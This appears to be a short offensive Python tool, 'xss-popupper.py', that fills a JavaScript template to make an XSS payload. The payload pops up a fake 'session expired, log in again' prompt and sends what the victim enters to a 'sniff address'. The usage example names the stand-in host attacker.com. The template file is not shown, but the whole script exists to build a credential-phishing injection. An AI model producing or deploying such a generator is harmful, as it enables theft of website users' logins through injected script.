import argparse

description = """
  python xss-popupper.py --url "http://attacker.com" --title "Log-in for session" --body "Your session has expired. Please log-in again" --time 5000
"""

parser = argparse.ArgumentParser("example", description)
parser.add_argument("--url", help="Write your sniff address url.", required=True)
parser.add_argument("--title", help="Write pop-up's title.", required=True)
parser.add_argument("--body", help="Write pop-up's body.", required=True)
parser.add_argument("--time", help="Write standby time.", required=True)
args = parser.parse_args()

fH = open("template.js", 'r')
template = fH.read()

template = template.replace("{{url}}", args.url)
template = template.replace("{{title}}", args.title)
template = template.replace("{{body}}", args.body)
template = template.replace("{{time}}", args.time)

fH.close()

fH = open("export.js", 'w')
fH.write(template)

fH.close()